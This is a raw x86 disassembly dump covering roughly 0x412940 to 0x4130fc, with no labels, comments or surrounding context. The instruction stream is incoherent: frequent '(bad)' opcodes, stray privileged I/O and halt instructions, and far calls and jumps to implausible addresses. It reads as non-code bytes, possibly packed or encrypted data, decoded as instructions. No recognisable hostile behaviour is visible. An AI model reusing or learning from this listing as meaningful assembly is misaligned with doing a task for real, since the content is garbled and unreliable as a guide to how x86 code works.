  412940:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  412946:	mov    esi,DWORD PTR [ecx]
  412948:	enter  0x49c,0xc7
  41294c:	add    al,al
  41294e:	add    bl,al
  412950:	(bad)  
  412951:	clc    
  412952:	enter  0x45,0x31
  412956:	push   eax
  412957:	pushf  
  412958:	mov    edi,eax
  41295a:	int3   
  41295b:	or     al,al
  41295d:	test   DWORD PTR [edi],edi
  41295f:	clc    
  412960:	gs inc ebp
  412962:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  412968:	push   ss
  412969:	xor    ecx,DWORD PTR [ebp+0x3]
  41296c:	sub    edx,DWORD PTR [ecx-0x76]
  41296f:	dec    ebp
  412970:	add    DWORD PTR [ebx+0x88d845],ecx
  412976:	mov    esi,DWORD PTR [ebx]
  412978:	or     BYTE PTR [ebx],al
  41297a:	cmp    edx,DWORD PTR [ecx-0x38]
  41297d:	dec    ebp
  41297e:	out    dx,eax
  41297f:	xor    eax,DWORD PTR [ebp+0x3]
  412982:	mov    edx,DWORD PTR [ecx-0x28]
  412985:	dec    ebp
  412986:	add    BYTE PTR [ebx],dh
  412988:	push   0x518003
  41298d:	push   eax
  41298e:	add    BYTE PTR [ebx-0x300748b],cl
  412994:	sbb    BYTE PTR [ebp+0x45],cl
  412997:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  41299d:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4129a3:	dec    ebp
  4129a4:	inc    ebp
  4129a5:	xor    ecx,eax
  4129a7:	add    ecx,eax
  4129a9:	push   ecx
  4129aa:	(bad)  
  4129ab:	dec    ebp
  4129ac:	mov    al,ds:0xc5e03dff
  4129b1:	retf   
  4129b2:	(bad)  
  4129b3:	into   
  4129b4:	sub    bh,bh
  4129b6:	dec    esp
  4129b7:	adc    al,0x9c
  4129b9:	inc    ebp
  4129ba:	push   ebp
  4129bb:	test   DWORD PTR [edi],ecx
  4129bd:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  4129c4:	jmp    0xc9ba38d8
  4129c9:	add    cl,dl
  4129cb:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4129d5:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4129db:	rol    BYTE PTR [eax],0x55
  4129de:	clc    
  4129df:	fs jb  0x4129e9
  4129e2:	mov    eax,DWORD PTR [ebp-0x30]
  4129e5:	xor    al,0x40
  4129e7:	sub    al,0xc7
  4129e9:	mov    ah,ch
  4129eb:	add    DWORD PTR [ebp+0x4534f845],eax
  4129f1:	sub    al,0x86
  4129f3:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4129fa:	mov    ch,0xff
  4129fc:	clc    
  4129fd:	add    DWORD PTR [ebp+0x60],0x3d
  412a01:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  412a08:	inc    ebp
  412a09:	dec    DWORD PTR [ebx-0x341ff701]
  412a0f:	test   esi,ecx
  412a11:	dec    DWORD PTR [ebx-0x7f8a3301]
  412a17:	push   eax
  412a18:	add    DWORD PTR [ebp+0x0],eax
  412a1b:	dec    ebx
  412a1d:	or     al,0xce
  412a1f:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  412a26:	into   
  412a27:	add    BYTE PTR [ebx-0x34ff1400],cl
  412a2d:	mov    esi,ecx
  412a2f:	sar    bh,0x45
  412a32:	adc    al,0x8b
  412a34:	clc    
  412a35:	fadd   DWORD PTR [ebp+0x0]
  412a38:	mov    ebp,DWORD PTR [edx+0x8]
  412a3b:	push   edi
  412a3c:	adc    BYTE PTR [eax+0x1],0x83
  412a40:	add    al,al
  412a42:	retf   
  412a43:	mov    ecx,esi
  412a45:	cld    
  412a46:	mov    eax,DWORD PTR [eax+0xcb01cc]
  412a4c:	into   
  412a4d:	add    BYTE PTR [ebx+0x756aec00],cl
  412a53:	jne    0x412a88
  412a55:	inc    DWORD PTR [ebx]
  412a57:	rcl    BYTE PTR [ecx+0x50],1
  412a5a:	push   eax
  412a5b:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  412a61:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  412a68:	sar    bh,0x84
  412a6b:	or     BYTE PTR [ebx],al
  412a6d:	push   eax
  412a6e:	add    BYTE PTR [ebx+0x4532c845],cl
  412a74:	pushf  
  412a75:	xor    edi,eax
  412a77:	pushf  
  412a78:	mov    ah,0x89
  412a7a:	test   eax,ebp
  412a7c:	clc    
  412a7d:	inc    ebp
  412a7e:	inc    ebp
  412a7f:	mov    DWORD PTR [eax+eax*8],esi
  412a82:	sub    al,0x30
  412a84:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  412a8b:	dec    ebp
  412a8c:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a90:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  412a96:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a9a:	or     DWORD PTR [ecx+0x45ff085c],0x0
  412aa1:	shl    DWORD PTR [ebp-0x380064],1
  412aa7:	int3   
  412aa8:	lea    eax,[ebp+0x45fff860]
  412aae:	push   eax
  412aaf:	xor    dh,BYTE PTR [ebp-0x64]
  412ab2:	(bad)  
  412ab3:	(bad)  
  412ab4:	pop    esp
  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	inc    DWORD PTR [ebp+0x4508f8ff]
  412abc:	mov    edi,DWORD PTR [eax+edx*8]
  412abf:	pushf  
  412ac0:	jo     0x412a89
  412ac2:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  412ac9:	inc    ebp
  412aca:	add    BYTE PTR [esi],bh
  412acc:	push   0x8b809c
  412ad1:	in     al,dx
  412ad2:	inc    ebp
  412ad3:	push   ebp
  412ad4:	mov    esi,DWORD PTR [ebx]
  412ad6:	cld    
  412ad7:	add    eax,DWORD PTR [eax+0xf013b]
  412add:	adc    al,0x0
  412adf:	add    bh,bh
  412ae1:	jmp    0xbe2bfe
  412ae6:	add    BYTE PTR [ebp+0x45],cl
  412ae9:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  412aef:	dec    ebp
  412af0:	push   0x38033
  412af5:	cmp    eax,DWORD PTR [eax]
  412af7:	unpcklps xmm7,xmm0
  412afa:	jne    0x412afc
  412afc:	dec    DWORD PTR [ebx+0x5545cc18]
  412b02:	mov    DWORD PTR [ebx],esi
  412b04:	shl    BYTE PTR [ebx],1
  412b06:	inc    ebp
  412b07:	add    ecx,DWORD PTR [ecx+0x60fc803]
  412b0d:	retf   0x5575
  412b10:	dec    DWORD PTR [ebx-0x5ba17e8]
  412b16:	(bad)  
  412b17:	stc    
  412b18:	in     al,dx
  412b19:	or     al,0x85
  412b1b:	dec    ebp
  412b1c:	clc    
  412b1d:	xor    eax,DWORD PTR [ebp+0x3]
  412b20:	mov    ebp,ecx
  412b22:	rol    BYTE PTR [eax],1
  412b24:	inc    ebp
  412b25:	add    BYTE PTR [eax-0x7747ab3],bh
  412b2b:	clc    
  412b2c:	inc    ebp
  412b2d:	retf   
  412b2e:	mov    edx,ebx
  412b30:	in     al,dx
  412b31:	(bad)  
  412b32:	retf   
  412b33:	into   
  412b34:	into   
  412b35:	scas   eax,DWORD PTR es:[edi]
  412b36:	dec    ebp
  412b37:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  412b3d:	sub    ecx,esi
  412b3f:	cmp    ecx,DWORD PTR [ebp+0x77]
  412b42:	(bad)  
  412b43:	mov    edi,eax
  412b45:	int3   
  412b46:	test   DWORD PTR [ecx-0x74baff08],ecx
  412b4c:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  412b53:	xor    eax,DWORD PTR [ebp+0x4503f803]
  412b59:	(bad)  
  412b5b:	retf   0x559c
  412b5e:	(bad)  
  412b5f:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  412b66:	inc    ebp
  412b67:	add    eax,0xeb9c4d3f
  412b6c:	(bad)  
  412b6d:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  412b73:	xor    ecx,DWORD PTR [ebp+0x33]
  412b76:	mov    eax,DWORD PTR [ebx]
  412b78:	call   0xce50f680
  412b7d:	retf   0x55d1
  412b80:	test   BYTE PTR [ebx-0x5ff17fe],cl
  412b86:	jmp    0x412b81
  412b88:	add    BYTE PTR ds:0xebf44d8b,al
  412b8e:	push   ebp
  412b8f:	mov    ebp,DWORD PTR [ebx]
  412b91:	mov    eax,0x33f8558b
  412b96:	retf   
  412b97:	xor    ecx,esi
  412b99:	add    edx,ecx
  412b9b:	add    eax,DWORD PTR [edx+0xca010f]
  412ba1:	push   ebp
  412ba2:	dec    ebp
  412ba3:	mov    ecx,DWORD PTR [ebx-0x34050718]
  412ba9:	stc    
  412baa:	rol    DWORD PTR ds:0xebce4dd6,cl
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  412bb7:	xor    ebp,DWORD PTR [ebx]
  412bb9:	xor    edi,DWORD PTR [ebx]
  412bbb:	add    esi,DWORD PTR [edi+0x3]
  412bbe:	mov    ecx,DWORD PTR [edi]
  412bc0:	clc    
  412bc1:	retf   0x55cb
  412bc4:	into   
  412bc5:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  412bcc:	test   al,0x4d
  412bce:	push   ebp
  412bcf:	jbe    0x412c04
  412bd1:	mov    esi,DWORD PTR [ebx]
  412bd3:	mov    al,0x3
  412bd5:	push   ebp
  412bd6:	add    esi,DWORD PTR [ebx]
  412bd8:	rdpmc  
  412bda:	retf   0x5503
  412bdd:	add    ecx,DWORD PTR [ebx-0x53517f1]
  412be3:	dec    ebp
  412be4:	stc    
  412be5:	mov    ecx,DWORD PTR [eax]
  412be7:	or     BYTE PTR [ebp+0x4d],cl
  412bea:	jmp    0x1352c7a
  412bef:	dec    ebp
  412bf0:	dec    ebp
  412bf1:	(bad)  
  412bf2:	mov    ebx,esp
  412bf4:	clc    
  412bf5:	test   ebx,ecx
  412bf7:	clc    
  412bf8:	ror    DWORD PTR [ebp-0x2a],cl
  412bfb:	mov    esi,ecx
  412bfd:	lock scas eax,DWORD PTR es:[edi]
  412bff:	inc    ebp
  412c00:	mov    esi,DWORD PTR [ebx]
  412c02:	hlt    
  412c03:	pushf  
  412c04:	jge    0x412b91
  412c06:	sub    ebx,esp
  412c08:	cmp    ecx,ebx
  412c0a:	ja     0x412bda
  412c0c:	mov    ebp,DWORD PTR [eax-0x58]
  412c0f:	dec    ebp
  412c10:	xor    ecx,DWORD PTR [di+0x3]
  412c14:	mov    esp,esp
  412c16:	clc    
  412c17:	push   ebp
  412c18:	retf   
  412c19:	mov    dl,bl
  412c1b:	adc    esi,edx
  412c1d:	jb     0x412bed
  412c1f:	add    BYTE PTR [edi-0xb7474b3],ch
  412c25:	lock jge 0x412bf3
  412c28:	sub    ecx,DWORD PTR [ebp+0x3b]
  412c2b:	mov    esi,DWORD PTR [edi-0x20]
  412c2e:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  412c35:	mov    BYTE PTR [ebx-0x34b20729],cl
  412c3b:	mov    edx,ebx
  412c3d:	lock (bad) 
  412c3f:	ror    esi,cl
  412c41:	push   ebp
  412c42:	scas   eax,DWORD PTR es:[edi]
  412c43:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  412c49:	pushf  
  412c4a:	sub    esi,DWORD PTR [edx]
  412c4c:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	xor    esp,DWORD PTR [ebx]
  412c55:	add    ecx,DWORD PTR [ebp-0x1c]
  412c58:	mov    edi,DWORD PTR [ebp-0x8]
  412c5b:	mov    bl,cl
  412c5d:	cmp    dl,bl
  412c5f:	jb     0x412c2f
  412c61:	add    dh,dl
  412c63:	dec    ebp
  412c64:	scas   eax,DWORD PTR es:[edi]
  412c65:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  412c6b:	shr    DWORD PTR [ebx],cl
  412c6d:	into   
  412c6e:	cmp    edx,esi
  412c70:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  412c76:	dec    ebp
  412c77:	dec    ebp
  412c78:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  412c7e:	retf   
  412c7f:	xor    edx,esi
  412c81:	add    ecx,esi
  412c83:	imul   ecx,edx
  412c86:	mov    DWORD PTR [ebp+0x8],edx
  412c89:	xor    ecx,DWORD PTR [ebp+0x2b]
  412c8c:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  412c92:	add    esi,DWORD PTR [ebx]
  412c94:	rol    BYTE PTR [ebx],0x45
  412c97:	rdtsc  
  412c99:	xlat   BYTE PTR ds:[ebx]
  412c9a:	pushf  
  412c9b:	jge    0x412c26
  412c9d:	xor    esp,eax
  412c9f:	sub    eax,DWORD PTR [ebp-0x73]
  412ca2:	(bad)  
  412ca3:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  412caa:	dec    ebp
  412cab:	xchg   BYTE PTR [ebx],dh
  412cad:	inc    DWORD PTR [ebx]
  412caf:	(bad)  
  412cb0:	jmp    0x412cff
  412cb2:	mov    ecx,DWORD PTR [ebx-0x34341324]
  412cb8:	dec    ebp
  412cb9:	into   
  412cba:	mov    ebp,DWORD PTR [edi-0x23737420]
  412cc0:	pushf  
  412cc1:	shl    DWORD PTR [edx],cl
  412cc3:	retf   0x5588
  412cc6:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412ccc:	add    eax,DWORD PTR [eax]
  412cce:	in     al,0x4d
  412cd0:	push   ebp
  412cd1:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  412cd7:	fs add ch,cl
  412cda:	dec    ebp
  412cdb:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  412ce1:	dec    ebp
  412ce2:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  412ce8:	jge    0x412cb8
  412cea:	mov    BYTE PTR [edi+0xf723b3a],ch
  412cf0:	add    cl,dh
  412cf2:	dec    ebp
  412cf3:	dec    DWORD PTR [ebx-0x2c032301]
  412cf9:	inc    ebp
  412cfa:	push   ebp
  412cfb:	dec    DWORD PTR [ebx-0x73ff1f34]
  412d01:	lea    ebx,[esp+edx*2+0x508bff32]
  412d08:	mov    ah,0x45
  412d0a:	push   ebp
  412d0b:	mov    esi,DWORD PTR [ebx]
  412d0d:	les    esi,FWORD PTR [ebx]
  412d0f:	add    BYTE PTR [ebx],al
  412d11:	inc    DWORD PTR [ebx]
  412d13:	mov    ecx,DWORD PTR [edi]
  412d15:	cld    
  412d16:	retf   0x4d80
  412d19:	add    DWORD PTR [ecx+0x4d30e400],ecx
  412d1f:	jne    0x412cac
  412d21:	(bad)  
  412d22:	in     al,dx
  412d23:	ror    bl,1
  412d25:	scas   al,BYTE PTR es:[edi]
  412d26:	into   
  412d27:	add    BYTE PTR [edi-0xf2f7475],ch
  412d2d:	not    bl
  412d2f:	adc    al,0xca
  412d31:	inc    ebp
  412d32:	push   ebp
  412d33:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  412d39:	push   0xaf80d6
  412d3e:	mov    eax,DWORD PTR [eax]
  412d40:	fdiv   st(7),st
  412d42:	sti    
  412d43:	sbb    dh,cl
  412d45:	pop    esi
  412d46:	xchg   esp,eax
  412d47:	leave  
  412d48:	pushf  
  412d49:	add    al,0x32
  412d4b:	push   ebp
  412d4c:	cmp    ebp,esp
  412d4e:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  412d52:	dec    DWORD PTR [ecx-0x740f0375]
  412d58:	push   ebp
  412d59:	cld    
  412d5a:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  412d60:	retf   0x558b
  412d63:	clc    
  412d64:	xor    esi,eax
  412d66:	add    esi,DWORD PTR [ebp-0x75]
  412d69:	(bad)  
  412d6a:	hlt    
  412d6b:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  412d72:	mov    DWORD PTR [edx],ecx
  412d74:	hlt    
  412d75:	(bad)  
  412d76:	dec    ebp
  412d77:	add    dh,BYTE PTR [ebx]
  412d79:	leave  
  412d7a:	mov    edx,0xffec8d55
  412d7f:	push   ecx
  412d80:	rol    DWORD PTR [ebp+0x55],1
  412d83:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  412d89:	mov    eax,0xf8030b33
  412d8e:	lar    ecx,di
  412d91:	push   ebp
  412d92:	retf   0x863b
  412d95:	jne    0x412d94
  412d97:	mov    edi,edi
  412d99:	or     BYTE PTR [ebp+0x41],dh
  412d9c:	mov    ebp,esp
  412d9e:	cld    
  412d9f:	inc    eax
  412da0:	mov    al,0x25
  412da2:	add    DWORD PTR [ecx+0x0],eax
  412da5:	in     eax,dx
  412da6:	test   DWORD PTR [ecx-0x1],eax
  412da9:	fdiv   st(7),st
  412dab:	ret    0x8b
  412dae:	cld    
  412daf:	mov    eax,DWORD PTR [eax+0x8d0151]
  412db5:	clc    
  412db6:	xor    BYTE PTR [ebp+0x45],al
  412db9:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  412dbf:	loopne 0x412dc0
  412dc1:	mov    edi,edi
  412dc3:	mov    ecx,eax
  412dc5:	clc    
  412dc6:	jne    0x412d98
  412dc8:	call   0x823ed1
  412dcd:	and    eax,0xc6854575
  412dd2:	je     0x412dd5
  412dd4:	mov    eax,esi
  412dd6:	cld    
  412dd7:	or     DWORD PTR [eax+0x401c9],eax
  412ddd:	push   ebp
  412dde:	add    ah,ch
  412de0:	add    BYTE PTR [ecx+0x6a],dl
  412de3:	inc    ebp
  412de4:	push   esi
  412de5:	mov    DWORD PTR [eax-0x4],edx
  412de8:	pop    edi
  412de9:	mov    ebx,DWORD PTR [ebx-0x4]
  412dec:	ret    0xbe
  412def:	push   es
  412df0:	mov    ecx,DWORD PTR [ecx-0x77274af]
  412df6:	clc    
  412df7:	lock inc ebp
  412df9:	jne    0x412e51
  412dfb:	(bad)  
  412dfc:	jne    0x412e02
  412dfe:	mov    eax,0xf841ba66
  412e03:	fadd   QWORD PTR [esi]
  412e05:	(bad)  
  412e06:	jne    0x412e45
  412e08:	cmp    eax,ebx
  412e0a:	pop    esi
  412e0b:	mov    ecx,DWORD PTR [eax]
  412e0d:	push   ecx
  412e0e:	inc    ecx
  412e0f:	lea    esi,[eax-0x8]
  412e12:	inc    edx
  412e13:	inc    ebp
  412e14:	int    0x8b
  412e16:	inc    edx
  412e17:	cld    
  412e18:	jo     0x412dd9
  412e1a:	inc    ecx
  412e1b:	xchg   edx,esp
  412e1d:	mov    ebx,eax
  412e1f:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  412e25:	or     edi,eax
  412e27:	inc    ebp
  412e28:	inc    ebp
  412e29:	(bad)  
  412e2a:	mov    ecx,DWORD PTR [eax]
  412e2c:	cld    
  412e2d:	(bad)  
  412e2e:	jmp    0x412e31
  412e30:	mov    eax,esi
  412e32:	mov    DWORD PTR ds:0x4f8c98b,eax
  412e38:	rcl    BYTE PTR [esi+0xf],1
  412e3b:	iret   
  412e3c:	inc    ebp
  412e3d:	leave  
  412e3e:	(bad)  
  412e3f:	dec    DWORD PTR [ecx]
  412e41:	mov    eax,esi
  412e43:	mov    eax,DWORD PTR [edi]
  412e45:	mov    dh,0xdd
  412e48:	push   es
  412e49:	nop
  412e4a:	(bad)  
  412e4b:	inc    DWORD PTR [ebx]
  412e4d:	push   esi
  412e4e:	leave  
  412e4f:	iret   
  412e50:	add    al,0x46
  412e52:	push   ebp
  412e53:	jmp    0xff928444
  412e58:	inc    ebp
  412e59:	push   esi
  412e5a:	mov    DWORD PTR [esi-0x4],eax
  412e5d:	in     eax,dx
  412e5e:	push   ebp
  412e5f:	sbb    BYTE PTR [eax+0x7c6daff],bh
  412e65:	add    al,BYTE PTR [edx]
  412e67:	mov    edx,DWORD PTR [ebp-0x17]
  412e6a:	cmp    edi,esi
  412e6c:	jne    0x412e6d
  412e6e:	(bad)  
  412e6f:	push   esi
  412e70:	pop    es
  412e71:	push   ebp
  412e72:	mov    ebp,esp
  412e74:	or     BYTE PTR [ebp+0x41],al
  412e77:	add    edi,esp
  412e79:	sub    BYTE PTR [eax-0x4],al
  412e7c:	int3   
  412e7d:	jne    0x412e41
  412e7f:	add    DWORD PTR [eax],eax
  412e81:	sbb    al,0x8b
  412e83:	mov    edx,DWORD PTR [ecx+0x14]
  412e86:	lea    edx,[edx-0x1ba7508]
  412e8c:	push   esi
  412e8d:	enter  0xd375,0xb8
  412e91:	test   DWORD PTR [esi],0x6ce0750
  412e97:	enter  0xd375,0x3b
  412e9b:	neg    DWORD PTR [esi+0x50]
  412e9e:	or     cl,dl
  412ea0:	inc    edx
  412ea1:	(bad)  
  412ea2:	loope  0x412e90
  412ea4:	(bad)  
  412ea5:	sub    eax,DWORD PTR [ebx]
  412ea7:	inc    eax
  412ea8:	loope  0x412efa
  412eaa:	add    dl,BYTE PTR [eax-0x37]
  412ead:	push   edi
  412eae:	push   ebp
  412eaf:	imul   ah
  412eb1:	adc    DWORD PTR [ecx-0x1],0x45
  412eb5:	add    BYTE PTR [ecx+0x55d3fc00],cl
  412ebb:	lea    edi,[eax-0x7fff4ca]
  412ec1:	mov    eax,0x4550402
  412ec6:	cmp    ebp,ecx
  412ec8:	jne    0x412e75
  412eca:	mov    eax,DWORD PTR ds:0x241e808
  412ed0:	in     eax,dx
  412ed1:	add    BYTE PTR [eax-0x7],al
  412ed4:	out    0x36,eax
  412ed6:	inc    ecx
  412ed7:	aas    
  412ed8:	jmp    0xccf15a
  412edd:	lock mov edi,DWORD PTR [ebp-0x18]
  412ee1:	and    edi,edi
  412ee3:	mov    edi,edi
  412ee5:	call   0xe40f2fc1
  412eea:	push   es
  412eeb:	add    al,ch
  412eed:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  412ef4:	(bad)  
  412ef5:	hlt    
  412ef6:	add    eax,0xffd3e87d
  412efb:	cmp    bh,0x8
  412efe:	(bad)  
  412eff:	fld    DWORD PTR [esi]
  412f01:	out    dx,al
  412f02:	call   0xffa02e0a
  412f07:	cmp    al,0x46
  412f09:	shl    edx,0x8
  412f0c:	(bad)  
  412f0d:	pop    es
  412f0e:	fisttp QWORD PTR [ebp+0xe577eff]
  412f14:	push   ebx
  412f15:	add    BYTE PTR [ebx+0x24008b56],cl
  412f1b:	add    BYTE PTR [ebp+0x50],al
  412f1e:	push   eax
  412f1f:	add    DWORD PTR [ebx+0x757d1834],ecx
  412f25:	sub    edx,DWORD PTR [esi-0x24]
  412f28:	jne    0x412ee0
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	mov    edx,DWORD PTR [edx-0x34]
  412f2e:	dec    esi
  412f2f:	out    0x83,eax
  412f31:	into   
  412f32:	push   edi
  412f34:	loopne 0x412f04
  412f36:	shr    BYTE PTR [edx+ecx*4+0x0],1
  412f3a:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  412f41:	rol    DWORD PTR [edx],0x8
  412f44:	mov    esp,ecx
  412f46:	cmp    DWORD PTR [ebx],0xc
  412f49:	mov    esi,0x5001c0
  412f4e:	push   eax
  412f4f:	push   cs
  412f50:	push   eax
  412f51:	(bad)  
  412f52:	sub    edx,edi
  412f54:	push   esi
  412f55:	adc    al,0xcb
  412f57:	ins    DWORD PTR es:[edi],dx
  412f58:	mov    eax,0x203e8
  412f5d:	add    al,ah
  412f5f:	inc    esi
  412f60:	mov    al,ch
  412f62:	pop    es
  412f63:	add    DWORD PTR [eax],0x1
  412f66:	add    dh,al
  412f68:	add    ah,ch
  412f6a:	rol    DWORD PTR [edx-0xd],1
  412f6d:	cli    
  412f6e:	push   0x4a
  412f70:	pop    ecx
  412f71:	retf   0xfe6
  412f74:	add    BYTE PTR [ebx-0x4e72f41e],al
  412f7a:	(bad)  
  412f7b:	dec    BYTE PTR [ebx+0x45b1fc72]
  412f81:	(bad)  
  412f82:	sub    ebp,DWORD PTR [ebx]
  412f84:	and    al,0x52
  412f86:	(bad)  
  412f87:	dec    edi
  412f88:	inc    ebp
  412f89:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  412f90:	add    BYTE PTR [ebp-0x7b],dh
  412f93:	pop    eax
  412f94:	add    BYTE PTR [edx+0x0],bl
  412f97:	pop    edx
  412f98:	dec    ebp
  412f99:	jmp    DWORD PTR [ebx]
  412f9b:	and    al,0xec
  412f9d:	push   edx
  412f9e:	out    0x64,eax
  412fa0:	jmp    0xd3f325a5
  412fa5:	jmp    0x412fff
  412fa7:	mov    al,0xfe
  412fa9:	dec    BYTE PTR [ebp-0x18fd8018]
  412faf:	add    BYTE PTR [esi+ebp*1],bh
  412fb2:	pop    edx
  412fb3:	icebp  
  412fb4:	mov    eax,cs
  412fb6:	ins    BYTE PTR es:[edi],dx
  412fb7:	adc    eax,0x75510000
  412fbc:	mov    esi,0x70158
  412fc1:	or     DWORD PTR [eax-0x74f48dfe],esi
  412fc7:	mov    edi,esp
  412fc9:	cld    
  412fca:	jge    0x413041
  412fcc:	(bad)  
  412fce:	aas    
  412fcf:	and    al,0x6d
  412fd1:	adc    cl,0x1
  412fd4:	mov    eax,DWORD PTR [eax]
  412fd6:	and    ecx,DWORD PTR [ebx-0x167203fd]
  412fdc:	dec    ebp
  412fdd:	add    eax,ebp
  412fdf:	add    BYTE PTR [edx],al
  412fe1:	fadd   DWORD PTR [eax]
  412fe3:	stc    
  412fe4:	enter  0xee00,0x8b
  412fe8:	sbb    eax,0x1
  412feb:	sbb    esi,ecx
  412fed:	in     al,0x0
  412fef:	in     eax,dx
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	jne    0x412f7f
  412ff4:	cmp    edx,esp
  412ff6:	jb     0x413001
  412ff8:	jmp    0x41306f
  412ffa:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  413000:	add    BYTE PTR [ebx+0x4d83d840],cl
  413006:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  41300c:	jb     0x412f97
  41300e:	pop    edx
  41300f:	fadd   QWORD PTR [ebx-0x7445faa1]
  413015:	or     dh,BYTE PTR [edx+0x0]
  413018:	inc    edx
  413019:	or     dl,bh
  41301b:	xlat   BYTE PTR ds:[ebx]
  41301c:	dec    edx
  41301d:	push   edi
  41301e:	add    al,0x7
  413020:	leave  
  413021:	rol    DWORD PTR [edx+eax*1],0x7
  413025:	add    ecx,ecx
  413027:	mov    edx,ecx
  413029:	int3   
  41302a:	jmp    0x412fea
  41302c:	mov    al,0x0
  41302e:	(bad)  
  41302f:	jne    0x413019
  413031:	mov    eax,DWORD PTR [edx]
  413033:	call   0xc155ad38
  413038:	pop    edi
  413039:	add    ebx,DWORD PTR [ecx-0x37]
  41303c:	pop    ecx
  41303d:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  413044:	push   es
  413045:	mov    eax,DWORD PTR [eax]
  413047:	int3   
  413048:	add    ch,al
  41304a:	jae    0x413034
  41304c:	int    0x1
  41304e:	enter  0x3000,0x18
  413052:	add    BYTE PTR [ebp+0x75],al
  413055:	mov    esi,DWORD PTR [eax-0x171f0134]
  41305b:	push   0x2
  41305d:	pop    ecx
  41305e:	add    BYTE PTR [eax],cl
  413060:	push   ebx
  413061:	lea    edi,[edi+eax*2]
  413064:	mov    al,0x1
  413066:	jb     0x413068
  413068:	mov    al,0x10
  41306a:	push   eax
  41306b:	add    al,0x75
  41306d:	add    BYTE PTR [ebx],ch
  41306f:	add    ebx,esp
  413071:	int3   
  413072:	jne    0x413084
  413074:	movsx  edx,cl
  413077:	add    DWORD PTR [eax],eax
  413079:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  413080:	mov    gs,edi
  413082:	add    BYTE PTR [eax-0x50],ch
  413085:	add    al,ch
  413087:	mov    eax,DWORD PTR [ecx]
  413089:	sub    eax,DWORD PTR [eax]
  41308b:	jb     0x413102
  41308d:	add    DWORD PTR [esp+eiz*8-0x50],esi
  413091:	jge    0x41307b
  413093:	add    al,0x1
  413095:	add    DWORD PTR [eax],0x0
  413098:	jne    0x41309a
  41309a:	je     0x4130e1
  41309c:	mov    eax,DWORD PTR [edi]
  41309e:	ror    BYTE PTR [ebp+0x4d],1
  4130a1:	or     DWORD PTR [ecx+0x4d03d004],0x3
  4130a8:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  4130ae:	mov    DWORD PTR [ebx],ebp
  4130b0:	fadd   DWORD PTR [eax+0x75]
  4130b3:	inc    eax
  4130b4:	pop    eax
  4130b5:	lea    ebx,[ecx+0x4f]
  4130b8:	push   0xb1000003
  4130bd:	out    dx,eax
  4130be:	add    ebp,DWORD PTR [edx+edx*2]
  4130c1:	add    BYTE PTR [ebx+ecx*4],bh
  4130c4:	mov    ch,BYTE PTR [ebx]
  4130c6:	jb     0x41313a
  4130c8:	add    al,0x89
  4130ca:	push   eax
  4130cb:	call   0x84297e3d
  4130d0:	add    DWORD PTR [eax+eax*1],eax
  4130d3:	jae    0x4130e9
  4130d5:	icebp  
  4130d6:	inc    ebp
  4130d7:	mov    eax,DWORD PTR gs:[ecx]
  4130da:	int3   
  4130db:	out    dx,al
  4130dc:	loopne 0x41312b
  4130de:	sub    eax,DWORD PTR [edx]
  4130e0:	push   0xffffff83
  4130e2:	pop    esi
  4130e3:	push   cs
  4130e4:	jl     0x4130ff
  4130e6:	add    al,0xaf
  4130e8:	xor    eax,0x832b6d00
  4130ed:	mov    eax,DWORD PTR [edx]
  4130ef:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4130f5:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4130fb:	inc    ebp
  4130fc:	shr    ebx,0x3
